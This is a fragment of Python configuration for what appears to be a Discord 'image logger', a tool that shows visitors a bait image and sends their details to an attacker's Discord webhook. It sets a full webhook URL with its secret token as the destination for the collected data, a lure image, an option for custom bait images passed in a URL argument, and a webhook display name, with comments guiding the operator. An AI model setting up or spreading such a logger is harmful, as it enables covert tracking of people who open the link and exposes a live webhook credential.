...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1429831225719390249/kLd7ZBEiUEDEQglgM2WwDBWuhrX_Gl_rvgAS_-JzFsQTv58Ce3t__YMfNeqDr4wJAyBI",
    "image": "https://www.westend61.de/images/0001245504pw/visualization-of-sperm-cells-racing-towards-egg-to-fertilize-SPCF00449.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "papaiia", # Set this to the name you want the webhook to have
